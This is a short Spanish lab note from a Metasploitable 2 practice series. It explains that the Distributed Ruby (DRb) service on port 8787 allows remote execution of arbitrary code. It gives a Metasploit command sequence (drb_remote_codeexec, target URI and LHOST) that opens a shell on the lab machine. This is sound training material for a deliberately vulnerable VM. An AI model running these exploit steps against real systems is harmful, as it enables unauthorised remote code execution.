# DRb — Ruby distribuido (puerto 8787) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** **DRb** (*Distributed Ruby*) permite que procesos Ruby invoquen objetos en otra máquina, parecido a Java RMI pero para Ruby. **Puerto 8787**.

**Cómo se explota:** el servicio permite **evaluar código Ruby arbitrario** de forma remota, lo que se traduce en **ejecución de comandos** en el sistema.

**Explotación manual (sin Metasploit):** se conecta con un cliente DRb desde `irb` (consola de Ruby) y se invoca un método que ejecute código del sistema. Por su especificidad, suele hacerse con el módulo de Metasploit.

## Explotación con Metasploit

```bash
use exploit/linux/misc/drb_remote_codeexec
set URI druby://192.168.100.9:8787
set LHOST 192.168.100.8
run
# -> ejecución de comandos / shell
```
